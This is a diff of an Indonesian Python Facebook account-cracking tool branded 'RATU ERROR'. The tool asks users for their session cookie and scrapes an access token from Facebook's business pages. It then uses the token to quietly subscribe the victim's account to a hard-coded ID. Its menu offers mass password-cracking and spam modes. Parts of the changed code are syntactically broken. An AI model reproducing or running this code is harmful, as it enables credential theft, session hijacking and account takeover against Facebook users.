@@ -1,5 +1,5 @@
 # coding=utf-8
-# coding by putri
+# coding by Romi Afrizal
 # Note : jangan di ubah lagi! nanti error, script udah enak
 
 import os, sys, subprocess, platform
@@ -136,23 +136,27 @@ author = 'Romi Afrizal'
 fb_me = 'facebook.com/romi.afrizal.102'
 github = 'github.com/Mark-Zuck'
 
-# LOGO
 def logo():
 	time.sleep (0.01)
-	jalan ('\x1b[1;97m⣿⣿⣿⡇⢩⠘⣴⣿⣥⣤⢦⢁⠄⠉⡄⡇⠛⠛⠛⢛⣭⣾⣿⣿⡏')
-	jalan ('\x1b[1;97m⣿⣿⣿⡇⠹⢇⡹⣿⣿⣛⣓⣿⡿⠞⠑⣱⠄⢀⣴⣿⣿⣿⣿⡟  💕   💖 💖 💞  ✨')
-	jalan ('\x1b[1;97m⣿⣿⣿⣧⣸⡄⣿⣪⡻⣿⠿⠋⠄⠄⣀⣀⢡⣿⣿⣿⣿⡿⠋     💕  ⭐ 💞 ')
-	jalan ('\x1b[1;97m⠘⣿⣿⣿⣿⣷⣭⣓⡽⡆⡄⢀⣤⣾⣿⣿⣿⣿⣿⡿⠋      💞 💖 💕   💖')
-	jalan ('\x1b[1;97m⠄⢨⡻⡇⣿⢿⣿⣿⣭⡶⣿⣿⣿⣜⢿⡇⡿⠟⠉    ✨     💖   💕  ✨ 💖 💕')
-	jalan ('\x1b[1;97m⠄⠸⣷⡅⣫⣾⣿⣿⣿⣷⣙⢿⣿⣿⣷⣦⣚⡀         ⭐     💖   💖')
-	jalan ('\x1b[1;97m⠄⠄⢉⣾⡟⠙⠶⠖⠈⢻⣿⣷⣅⢻⣿⣿⣿⣿⣿⣶⣶⡆⠄⣤⡀        💞 ✨ 💕')
-	jalan ('\x1b[1;97m⠄⢠⣿⣿⣧⣀⣀⣀⣀⣼⣿⣿⣿⡎⢿⣿⣿⣿⣿⣿⣿⣇⠄⠈⠁      💞  💖      ⭐')
-	jalan ('\x1b[1;97m⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⣎⢿⣿⣿⣿⣿⣿⣿⣿⣶⣶    ⭐        💖')
-	jalan ('\x1b[1;97m⠄⠄⠻⢿⣿⣿⣿⣿⣿⣿⣿⢟⣫⣾⣿⣷⡹⣿⣿⣿⣿⣿⣿⣿⡟         💖    💞')
-	jalan ('\x1b[1;97m⠄⠄⠄⠄⢮⣭⣍⡭⣭⡵⣾⣿⣿⣿⡎⣿⣿⣌⠻⠿⠿⠿⠟⠋ JANGAN LUPA.....   ✨')
-	jalan ('\x1b[1;97m⠄⠄⠄⠄⠈⠻⣿⣿⣿⣿⣹⣿⣿⣿⡇⣿⣿⡿ \x1b[1;96m⣾⣿⣿ ⣾⣿⣷ ⣿   ⣿⢿⡿⣿ ⣾⠛⠛ ⢿ ⡿ " ⣾⠛⣷')
-	jalan ('\x1b[1;97m⠄⠄⣀⣴⣾⣶⡞⣿⣿⣿⣿⣿⣿⣿⣾⣿⡿⠃ \x1b[1;96m⣿   ⣿ ⣿ ⣿   ⣿⠙⠋⣿ ⣿⣿   ⣿     ⣫')
-	jalan ('\x1b[1;97m⣠⣾⣿⣿⣿⣿⣿⣹⣿⣿⣿⣿⣿⡟⣹⣿⣳⡄ \x1b[1;96m⢿⣿⣿ ⢿⣿⡿ ⢿⣿⣿ ⣿  ⣿ ⢿⣤⣤ ⣾ ⣷   ⢿⣤⡿')
+	print ('')
+	print ('')
+	jalan ('\x1b[1;97m                       _____---____ ')
+	jalan ('\x1b[1;97m                    ________---_______ ')
+	jalan ('\x1b[1;97m         ___-----           __      ----_ ')
+	jalan ('\x1b[1;97m    ---______        ----                 \ ')
+	jalan ('\x1b[1;97m                 --__    |             _____) ')
+	jalan ('\x1b[1;97m                     -                /     \ ')
+	jalan ('\x1b[1;97m          _____-----    ___--         \    /)\ ')
+	jalan ('\x1b[1;97m    -----_____      ---____            \__/  / ')
+	jalan ('\x1b[1;97m                 --__    \ --    _          /\ ')
+	jalan ('\x1b[1;97m                      --__-__     \_____/   \_/\ ')
+	jalan ('\x1b[1;97m                            ----|   /          | ')
+	jalan ('\x1b[1;96mAuthor \x1b[1;97m : \x1b[1;94mRomi Afrizal\x1b[1;97m          |  |___________| ')
+	jalan ('\x1b[1;96mAdmin  \x1b[1;97m : \x1b[1;93mJessica Putri\x1b[1;97m         |  | ((_(_)| )_) ')
+	jalan ('\x1b[1;96mGroup\x1b[1;97m   : \x1b[1;92mRATU ERROR            \33[0;1m\x1b[1;97m|  \_((_(_)|/(_) ')
+	jalan ('\x1b[1;96m¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\x1b[1;97m\             ( ')
+	jalan ('\x1b[1;96m¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤\x1b[1;97m\_____________)')
+	print
 
 def banner():                
 	os.system('clear')
@@ -164,86 +168,151 @@ def banner():
 	jalan ('       \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mA\033[1;96m] \033[1;96m[\033[1;97mT\033[1;96m] \033[1;96m[\033[1;97mU\033[1;96m]  \033[1;96m[\033[1;97mE\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m] \033[1;96m[\33[37;1mR\033[1;96m] \033[1;96m[\033[1;97mO\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m]\033[1;96m')
 	print (' \033[1;96m  ____________________________________________')
 	print ('\033[1;97m\033[1;96m ¤\033[1;97m{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}{}\033[1;96m¤')
-	
-# METHODE LOGIN
-def login():
-	try:
-		ses = requests.Session()
-		logo()
-		kukis = input(f'\n{P} Masukan cookie anda :{K} ')
-		url_tokB = ses.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies = {"cookie":kukis})
-		ids_tokB = re.search("act=(.*?)&nav_source", url_tokB.text).group(1)
-		con_tokB = ses.get(f'https://www.facebook.com/adsmanager/manage/campaigns?act={ids_tokB}&nav_source=no_referrer', cookies = {"cookie":kukis})
-		tokenB = re.search('accessToken="(.*?)"',con_tokB.text).group(1)
-		open('data/token.txt','w').write(tokenB)
-		open('data/cookie.txt','w').write(kukis)
-		print (f"\n{P} + token:{H} {tokenB}");jeda(2)
-		requests.post(f"https://graph.facebook.com/100010061977994/subscribers?access_token={tokenB}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
-		print (f"\n{H} √ login berhasil");jeda(2)
-		menu()
-	except Exception as e:
-		try:os.system (hapus)
-		except:pass
-		try:os.system("clear")
-		except:pass
-		print(e)
+
+id = []
+cp = []
+ok = []
+loop = 0
+    
+# CONVERT COOKIE DICT TO STRING
+def romz_xyz(cookie,venom={}):
+	for x in cookie.replace(' ','').strip().split(';'):
+		kuki = x.split('=')
+		if len(kuki) > 1:
+			venom.update({kuki[0]: kuki[1]})
+	return venom
+
+# MENU MASUK
+def Masuk():
+	logo()
+	print('')
+	print ('\n%s[%s01%s] %sLogin menggunakan cookies '%(O,P,O,P))
+	print ('%s[%s02%s] %sCara mendapatkan cookies '%(O,P,O,P))
+	print ('%s[%s03%s] %sLihat hasil crack '%(O,P,O,P))
+	print ('%s[%s00%s] %sKeluar '%(O,P,O,P))
+	rom = input ("\n%s[%s?%s] %sPILIH %s: %s"%(O,P,O,O,H,K))
+	if rom in['']:
+		exit ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
+	elif rom in['1','01']:
+		kukis = input("\n%sMasukan cookie %s: %s"%(P,H,K))
+		with requests.Session() as ROMZ:
+			try:
+				get_tok = ROMZ.get('https://business.facebook.com/business_locations',headers = {"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "en-GB,en-US;q=0.9,en;q=0.8","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":kukis})
+				token = re.search("(EAAG\w+)", get_tok.text).group(1)
+				open('data/cookie.txt','w').write(kukis)
+				open('data/token.txt','w').write(token)
+				requests.post(f"https://graph.facebook.com/100028434880529/subscribers?access_token={token}",cookies={"cookie":open("data/cookie.txt","r").read()}).json()
+				print ("\n%s √ login berhasil "%(H));jeda(2)
+				Menu()
+			except (KeyError):
+				exit ("\n%s× cookie kadaluwarsa "%(M));jeda(2)
+			except (IOError):
+				exit ("\n%s× login gagal, periksa cookies anda "%(M));jeda(2)
+			except (AttributeError):
+				exit ("\n%s× terjadi kesalahan "%(M));jeda(2)
+			except requests.exceptions.ConnectionError:
+				exit ("\n%s%s tidak ada koneksi "%(M,til));jeda(2)
+	elif rom in['2','02']:
+		os.system("xdg-open https://www.youtube.com/channel/UC-ZVCYSPdDiAKJ0a80GLHiw")
 		exit()
-#  MENU
+	elif rom in['3','03']:
+		hasil_fb()
+	elif rom in['0','00']:
+		jalan ('\n%s%s Sampai jumpa tod...'%(M,til));jeda(2);exit()
+	else:
+		exit ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
+		
+# MENU PILIHAN INI AJG
+hapus = ('rm -rf data/token.txt && rm -rf data/cookie.txt')
 def Menu():
+	try:
+		os.system("clear")
+		licensi = open(".licensi","r").read().strip()
+		gets = requests.get("https://business.facebook.com/business_locations',cookies={'cookie':mycok})
+		if "error" in gets["status"]:
+			exit(" [×] message: "+gets["msg"]+"\n\n")
+		elif "berlaku" in gets["status"]:
+			print("[✓] Anda telah masuk di zona "+gets["usage"]+" selamat menggunakan fitur kami")
+			os.system("clear")
+		elif "kadaluarsa" in gets["status"]:
+			exit("[!] Licensi anda telah kadaluarsa, silahkan chat admin untuk memperpanjang")
+		else:
+			exit("[!] licensi tidak valid")
+	except FileNotFoundError:
+		activate_licensi()
+	folder()
 	try:
 		token = open("data/token.txt","r").read()
 		coki = {"cookie":open("data/cookie.txt","r").read()}
-		try:
-			nama=requests.get(f"https://mbasic.facebook.com/profile.php?v=info",cookies = coki).text 
-		except:
-			try:os.system (hapus)
-			except:pass
-			try:os.system("clear")
-			exit()
-	except (FileNotFoundError,KeyError,IOError):
-#		print (f"{M} ! cookie invalid");jeda(2)
-		login()
-	except requests.exceptions.ConnectionError:
-		exit(f"{M} ! tidak ada koneksi")
+		nama = requests.get(f'https://www.facebook.com/adsmanager/manage/campaigns',cookies={'cookie':mycok},allow_redirects=True).text
+	except KeyError:
+		print ("\n%s cookie kadaluwarsa "%(M));jeda(2)
+		os.system (hapus)
+		Masuk()
+	except FileNotFoundError:
+		os.system (hapus)
+		os.system("clear")
+		Masuk()
+	except requests.exceptions.ConnectionError as konek:
+		exit (f"\n%s%s gagal memuat tidak ada koneksi: {konek}"%(M,til));jeda(2)
 	banner()
-	print('\n')
-	print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mCrack dari  ID publik')
-	print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mCrack \x1b[1;92mUNLIMITED')
-	print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mCrack dari  pencarian nama')
-	print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mCrack dari  jumlah follower')
-	print (' \x1b[1;96m[\x1b[1;97m5\x1b[1;96m] \x1b[1;97mCrack dari  anggota group')
-	print (' \x1b[1;96m[\x1b[1;97m6\x1b[1;96m] \x1b[1;97mLihat hasil crack')
-	print (' \x1b[1;96m[\x1b[1;97m7\x1b[1;96m] \x1b[1;97mSetting user agent')
-	print (' \x1b[1;96m[\x1b[1;97m0\x1b[1;96m] \x1b[1;91mKeluar')
 	print('')
-	romz=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
-	if romz in ['']:print ("\n ! jangan kosong")
-	elif romz in ['1']:publik(coki)
-	elif romz in ['2']:massal(token,coki)
-	elif romz in['3']:mail_name()
-	elif romz in['4']:follow(token,coki)
-	elif romz in['5']:exit()
-	elif romz in ['6']:hasil()
-	elif romz in ['7']:
-		crack().UA()
-		uas = open('ugent.txt','r').read()
-		print (f"{P} ! User-Agent saat ini: {U}{uas}")
-		print (f"{P} ! jika tidak mau ingin mengganti User-Agent ketik {H}no{P} ")
-		us = input (" ? User-Agent: ")
-		if us in['no','No','NO']:
-			exit()
-		elif us in['']:
-			uas = ("Mozilla/5.0 (Linux; Android 4.2.2; FreeTAB 9000 IPS IC Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36")
-			open('ugent.txt','w').write(uas)
-		else:
-			open('ugent.txt','w').write(us)
-	elif romz in ['0']:
-		try:os.system (hapus)
-		except:pass
-		try:os.system("clear")
-		except:pass
+	print('')
+	print (' %s[%s01%s] %sCrack dari publik'%(O,P,O,P))
+	print (' %s[%s02%s] %sCrack %sUNLIMITED'%(O,P,O,P,H))
+	print (' %s[%s03%s] %sCrack dari follower'%(O,P,O,P))
+	print (' %s[%s04%s] %sCrack dari reaction post'%(O,P,O,P))
+	print (' %s[%s05%s] %sCrack dari komentar post'%(O,P,O,P))
+	print (' %s[%s06%s] %sCrack dari anggota group'%(O,P,O,P))
+	print (' %s[%s07%s] %sCrack dari pencarian nama'%(O,P,O,P))
+	print (' %s[%s08%s] %sCrack dari pesan mesengger'%(O,P,O,P))
+	print (' %s[%s09%s] %sCrack dari saran teman'%(O,P,O,P))
+	print (' %s[%s10%s] %sLihat hasil crack'%(O,P,O,P))
+	print (' %s[%s11%s] %sCheckpoint detektor'%(O,P,O,P))
+	print (' %s[%s12%s] %sCek ID'%(O,P,O,P))
+	print (' %s[%s13%s] %sSpam limited editon'%(O,P,O,P))
+	print (' %s[%srm%s] %sHapus data login'%(O,P,O,P))
+	pilih(token,coki)
+
+def pilih(token,coki):
+	slut = input("\n %s[%s?%s] %sPILIH %s: %s"%(O,P,O,O,H,K))
+	if slut in['',' ']:
+		exit ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
+	elif slut in['1','01']:
+		PublikGRAPH(token,coki)
+	elif slut in['2','02']:
+		MassalPublikGRAPH(token,coki)
+	elif slut in['3','03']:
+		FollowGRAPH(token,coki)
+	elif slut in['4','04']:
+		ComingSoon()
+	elif slut in['5','05']:
+		ComingSoon()
+	elif slut in['6','06']:
+		ComingSoon()
+	elif slut in['7','07']:
+		ComingSoon()
+	elif slut in['8','08']:
+		ComingSoon()
+	elif slut in['9','09']:
+		ComingSoon()
+	#elif slut in['9','09']:
+		#useragent()
+	elif slut in['10','10']:
+		hasil_fb()
+	elif slut in['10']:
+		file_cp()
+	elif slut in['11']:
+		ingfoh()
+	elif slut in['rm','RM','Rm']:
+		os.system(hapus)
+	elif slut in['0','00']:
+		exit()
 	else:
-		print ("\n ! isi yg benar")
+		exit ("\n%sIsi yang benar %sGOBLOK's%s.....!!!"%(P,H,P))
+		
+def ComingSoon():
+	jalan ("\n %sMenu belum tersedia... "%(O));exit()
 			
 # CRACK PUBLIK 
 def PublikGRAPH(token,cookie):
